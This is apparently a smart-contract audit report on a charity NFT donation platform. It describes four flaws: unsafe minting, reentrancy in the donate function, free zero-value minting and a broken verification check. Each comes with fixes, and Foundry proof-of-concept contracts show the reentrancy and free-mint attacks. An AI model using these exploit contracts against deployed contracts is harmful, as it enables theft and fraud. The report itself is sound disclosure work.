# M-01 Use of `_mint()` May Lock NFTs in Incompatible Contracts

## Summary

The `GivingThanks::donate` function uses `_mint()` to mint NFTs to donors without ensuring the recipient can handle ERC721 tokens. This can result in NFTs being irreversibly locked if sent to smart contracts that are not designed to receive ERC721 tokens.

## Vulnerability Details

In the `GivingThanks` contract, the `donate` function mints an NFT to the donor using `_mint()`:

```solidity
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");

    _mint(msg.sender, tokenCounter);

    // Create metadata for the tokenURI
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(tokenCounter, uri);

    tokenCounter += 1;
}
```

The `_mint()` function does not check whether the recipient (`msg.sender`) is a smart contract capable of handling ERC721 tokens. If `msg.sender` is a contract that does not implement the `IERC721Receiver` interface, the NFT will be permanently locked in that contract, as it cannot respond to the token transfer appropriately.

Using `_safeMint()` instead of `_mint()` ensures that if the recipient is a contract, it must implement `onERC721Received()`. If it doesn't, the minting operation will revert, preventing the NFT from being locked in an incompatible contract.

## Impact

- **Permanent Loss of NFTs:** NFTs may become inaccessible if minted to contracts that cannot handle them.
- **User Frustration:** Donors using smart contract wallets or interacting through contracts may not receive their NFTs, leading to a poor user experience.
- **Potential Legal and Financial Implications:** Loss of valuable NFTs could have legal or financial repercussions for the platform.

## Tools Used

- Manual code review
- Solidity documentation and ERC721 standard specifications

## Recommendations

- **Replace `_mint()` with `_safeMint()`:**

  Modify the `donate` function as follows:

```diff
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");

-   _mint(msg.sender, tokenCounter);
+   _safeMint(msg.sender, tokenCounter);

    // Create metadata for the tokenURI
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(tokenCounter, uri);

    tokenCounter += 1;
}
```


- **Benefit of Using `_safeMint()`:**

  - Ensures that if the recipient is a smart contract, it must implement `IERC721Receiver`, preventing tokens from being locked.
  - Provides an additional safety check without significant overhead.

- **Additional Considerations:**

  - Inform users that they should ensure their wallets or contracts are compatible with ERC721 tokens.
  - Consider implementing a fallback mechanism or user notification if the minting fails.

By making this change, you enhance the security and reliability of the NFT minting process, safeguarding user assets and improving overall platform trust.



# M-02 Reentrancy Vulnerability in `donate` Function Allows Unauthorized Minting of Multiple NFTs

## Summary

The `GivingThanks::donate` function is vulnerable to a reentrancy attack due to improper ordering of state changes and external calls. An attacker can exploit this vulnerability to re-enter the `donate` function multiple times in a single transaction, minting multiple NFTs without making additional donations. This attack remains possible even after correcting the `isVerified` function, as the `donate` function does not follow the Checks-Effects-Interactions (CEI) pattern.

## Vulnerability Details

**Vulnerable Code:**

```solidity
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");

    _mint(msg.sender, tokenCounter);

    // Create metadata for the tokenURI
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(tokenCounter, uri);

    tokenCounter += 1;
}
```

**Issue:**

- The external call to the `charity` address is made before updating critical state variables like `tokenCounter`.
- An attacker-controlled `charity` contract can implement a fallback function (`receive()`) that re-enters the `donate` function.
- Since state changes occur after the external call, the attacker can repeatedly re-enter `donate`, minting multiple NFTs.

<details>
<summary>Proof of Concept:</summary>


The following test demonstrates the reentrancy attack:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract ReentrancyTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    address public admin;
    address public charity;
    address public donor;

    function setUp() public {
        // Initialize addresses
        admin = makeAddr("admin");
        charity = makeAddr("charity");
        donor = makeAddr("donor");

        // Deploy the CharityRegistry contract as admin
        vm.prank(admin);
        registryContract = new CharityRegistry();

        // Deploy the GivingThanks contract with the registry address
        vm.prank(admin);
        charityContract = new GivingThanks(address(registryContract));

        // Register and verify the charity
        vm.prank(admin);
        registryContract.registerCharity(charity);

        vm.prank(admin);
        registryContract.verifyCharity(charity);
    }

    function testReentrancyInDonate() public {
        // Deploy the reentrant contract
        ReentrantContract reentrantContract = new ReentrantContract(charityContract, registryContract);

        // Register and verify the ReentrantContract as a charity
        vm.prank(admin);
        registryContract.registerCharity(address(reentrantContract));

        vm.prank(admin);
        registryContract.verifyCharity(address(reentrantContract));

        // Fund the reentrant contract
        vm.deal(address(reentrantContract), 1 ether);

        // Start the prank as the reentrant contract
        vm.startPrank(address(reentrantContract));

        // Attempt to donate to the ReentrantContract itself
        charityContract.donate{value: 1 ether}(address(reentrantContract));

        // Stop the prank
        vm.stopPrank();

        // Check if multiple tokens were minted
        uint256 attackerTokenBalance = charityContract.balanceOf(address(reentrantContract));
        assertTrue(attackerTokenBalance > 1, "Reentrancy attack failed to mint multiple tokens");
        assertTrue(attackerTokenBalance == 11, "Reentrancy attack minted too many tokens");
    }
}

contract ReentrantContract is IERC721Receiver {
    GivingThanks charityContract;
    CharityRegistry registryContract;
    uint256 counter = 0;
    uint256 maxReentrancy = 10; // Set a limit to prevent infinite loops

    constructor(GivingThanks _charityContract, CharityRegistry _registryContract) {
        charityContract = _charityContract;
        registryContract = _registryContract;
    }

    receive() external payable {
        if (counter < maxReentrancy) {
            counter++;
            // Re-enter the donate function
            charityContract.donate{value: 0}(address(this));
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // Accept the NFT
        return IERC721Receiver.onERC721Received.selector;
    }
}
```

**Explanation:**

- The `ReentrantContract` is registered and verified as a charity.
- When `donate` is called, the Ether is sent to `ReentrantContract`, triggering the `receive()` function.
- The `receive()` function re-enters `donate`, allowing the attacker to mint multiple NFTs without additional donations.
- The test confirms that 11 NFTs are minted instead of 1.

</details>

**Note:** This attack works even if the `isVerified` function is correctly implemented, as the vulnerability lies in the ordering of operations within the `donate` function.

## Impact

- **Unauthorized Minting of NFTs:** Attackers can mint multiple NFTs without making corresponding donations.
- **Financial Loss:** Potential loss of funds if the contract holds Ether or if NFTs have monetary value.
- **State Corruption:** Reentrancy can lead to inconsistent state, affecting the contract's integrity.
- **Reputation Damage:** Exploitation undermines user trust and platform credibility.

## Tools Used

- **Forge (Foundry):** For writing and running the test cases.
- **Manual Code Analysis:** To identify the improper order of operations.
- **Solidity Documentation:** For understanding the behavior of external calls and reentrancy.

## Recommendations

- **Apply the Checks-Effects-Interactions Pattern:**

  Rearrange the `donate` function to update state variables before making external calls:

  ```diff
  function donate(address charity) public payable {
      require(registry.isVerified(charity), "Charity not verified");

  +   _mint(msg.sender, tokenCounter);
  +   string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
  +   _setTokenURI(tokenCounter, uri);
  +   tokenCounter += 1;

      (bool sent,) = charity.call{value: msg.value}("");
      require(sent, "Failed to send Ether");
  }
  ```

- **Use Reentrancy Guards:**

  Import OpenZeppelin's `ReentrancyGuard` and apply the `nonReentrant` modifier to the `donate` function:

  ```solidity
  import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

  contract GivingThanks is ERC721URIStorage, ReentrancyGuard {
      // ...

      function donate(address charity) public payable nonReentrant {
          // Function body
      }
  }
  ```

- **Avoid Calling Untrusted Contracts:**

  Consider whether it's necessary to send Ether directly to the `charity` address or if an alternative mechanism can be used.

- **Implement Access Control:**

  Ensure that only legitimate interactions are permitted by enforcing strict access controls and validations.

By applying these recommendations, the contract will prevent reentrancy attacks, ensuring that state changes occur before any external interactions, thus maintaining the contract's integrity and security.


# H-01 Zero Ether Donations Allows Unlimited Free NFT Minting Without Actual Contributions

## Summary

The `GivingThanks::donate` function allows donors to mint NFTs without requiring any Ether to be sent. This vulnerability enables anyone to mint unlimited NFTs for free by repeatedly calling the `donate` function with zero Ether, undermining the platform's purpose of facilitating charitable donations.

## Vulnerability Details

**Vulnerable Code:**

```solidity
function donate(address charity) public payable {
    require(registry.isVerified(charity), "Charity not verified");
    (bool sent,) = charity.call{value: msg.value}("");
    require(sent, "Failed to send Ether");

    _mint(msg.sender, tokenCounter);

    // Create metadata for the tokenURI
    string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
    _setTokenURI(tokenCounter, uri);

    tokenCounter += 1;
}
```

**Issue:**

- The `donate` function does not enforce a minimum `msg.value`, allowing calls with zero Ether.
- Donors can call `donate` with `msg.value == 0`, resulting in the minting of an NFT without any actual donation.
- The call to `charity.call{value: msg.value}("")` with zero value does not transfer any Ether to the charity.

**Proof of Concept:**

The following test demonstrates the vulnerability:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/GivingThanks.sol";
import "../src/CharityRegistry.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract MintForFreeTest is Test {
    GivingThanks public charityContract;
    CharityRegistry public registryContract;
    address public admin;
    address public charity;
    address public donor;

    function setUp() public {
        // Initialize addresses
        admin = makeAddr("admin");
        charity = makeAddr("charity");
        donor = makeAddr("donor");

        // Deploy the CharityRegistry contract as admin
        vm.prank(admin);
        registryContract = new CharityRegistry();

        // Deploy the GivingThanks contract with the registry address
        vm.prank(admin);
        charityContract = new GivingThanks(address(registryContract));

        // Register and verify the charity
        vm.prank(admin);
        registryContract.registerCharity(charity);

        vm.prank(admin);
        registryContract.verifyCharity(charity);
    }

    function testMintNFTForFree() public {
        // Deploy the mintForFree contract
        MintForFree mintContract = new MintForFree();

        // Start the prank as the mintForFree contract
        vm.startPrank(address(mintContract));

        // Attempt to donate 0 Ether to the charity multiple times
        for (uint256 i = 0; i < 3; i++) {
            charityContract.donate{value: 0}(address(charity));
        }

        // Stop the prank
        vm.stopPrank();

        // Check if multiple tokens were minted
        uint256 attackerTokenBalance = charityContract.balanceOf(address(mintContract));
        // 3 NFTs should have been minted for free
        assertTrue(attackerTokenBalance == 3, "Attacker did not mint 3 tokens as expected");
        // Balance of charity should be 0
        assertEq(charity.balance, 0);
    }
}

contract MintForFree is IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

**Explanation:**

- The `MintForFree` contract calls `donate` with `msg.value == 0` three times.
- Each call results in minting an NFT to the `MintForFree` contract without any Ether being sent to the charity.
- The test confirms that three NFTs were minted, and the charity's balance remains zero.

## Impact

- **Unauthorized Minting of NFTs:** Users can mint unlimited NFTs without making any donations.
- **Financial Loss for Charities:** Charities do not receive expected funds from supposed donations.
- **Undermines Donation Model:** The fundamental purpose of the platform—to facilitate donations—is compromised.
- **Reputation Damage:** The platform may lose credibility if users exploit this to obtain NFTs without contributing.

## Tools Used

- **Forge (Foundry):** For writing and executing the test case.
- **Manual Code Review:** To identify the lack of minimum donation enforcement.

## Recommendations

- **Enforce a Minimum Donation Amount:**

  Add a check to ensure that `msg.value` is greater than zero:

  ```diff
  function donate(address charity) public payable {
      require(registry.isVerified(charity), "Charity not verified");
  +   require(msg.value > 0, "Donation amount must be greater than zero");

      (bool sent,) = charity.call{value: msg.value}("");
      require(sent, "Failed to send Ether");

      _mint(msg.sender, tokenCounter);

      // Create metadata for the tokenURI
      string memory uri = _createTokenURI(msg.sender, block.timestamp, msg.value);
      _setTokenURI(tokenCounter, uri);

      tokenCounter += 1;
  }
  ```

- **Consider Setting a Minimum Donation Threshold:**

  - Define a minimum acceptable donation amount (e.g., 0.01 Ether) to prevent micro-donations that might not be meaningful after gas costs.

- **Validate Donation Success:**

  - Ensure that the Ether transfer to the charity is successful and that the amount is significant before minting the NFT.

- **Update Tests Accordingly:**

  - Modify existing tests to account for the minimum donation requirement.
  - Add tests to verify that donations below the minimum amount are rejected.

By implementing these recommendations, the contract will prevent users from minting NFTs without making actual donations, preserving the platform's integrity and ensuring that charities receive the intended funds.


# M-03 Incorrect `isVerified` Function Allows Unverified Charities to Be Treated as Verified

## Summary

In the `CharityRegistry` contract, the `isVerified` function incorrectly returns the status from the `registeredCharities` mapping instead of the `verifiedCharities` mapping. This flaw allows any registered charity to be considered verified without undergoing the proper verification process. As a result, unverified charities can receive donations intended for verified charities, posing a significant security risk.

## Vulnerability Details

**Affected Code:**

```solidity
function isVerified(address charity) public view returns (bool) {
    return registeredCharities[charity];
}
```

**Issue:**

- The `isVerified` function mistakenly checks the `registeredCharities` mapping instead of the `verifiedCharities` mapping.
- This means that any charity that registers using `registerCharity` is automatically considered verified, even if it hasn't been approved by the admin via `verifyCharity`.

**Proof of Concept:**

The following test can be added to the existing test file and demonstrates the vulnerability:

```solidity
function testIsVerifiedWithUnverifiedCharity() public {
    address unverifiedCharity = makeAddr("unverifiedCharity");
    
    // Register but don't verify the charity
    vm.prank(unverifiedCharity);
    registryContract.registerCharity(unverifiedCharity);

    // Check that the charity is (incorrectly) considered verified
    bool isVerified = registryContract.isVerified(unverifiedCharity);
    assertTrue(isVerified);
}
```

**Explanation:**

- An unverified charity registers itself using `registerCharity`.
- When `isVerified` is called, it incorrectly returns `true` because it checks `registeredCharities[unverifiedCharity]`, which is `true`.
- This demonstrates that unverified charities are treated as verified, allowing them to receive donations without proper verification.

## Impact

- **Bypass of Verification Process:** Unverified or malicious charities can pose as verified entities.
- **Financial Loss:** Donors may unknowingly send funds to fraudulent charities.

## Tools Used

- **Manual Code Review:** To identify the incorrect return value in the `isVerified` function.
- **Testing Framework:** Used Forge (Foundry) to create and run the proof-of-concept test case.

## Recommendations

- **Correct the `isVerified` Function:**

  Update the function to check the `verifiedCharities` mapping instead:

  ```diff
  function isVerified(address charity) public view returns (bool) {
  -   return registeredCharities[charity];
  +   return verifiedCharities[charity];
  }
  ```

By implementing these changes, the contract will correctly enforce the verification process, ensuring that only properly verified charities can receive donations, thereby protecting donors and maintaining trust in the platform.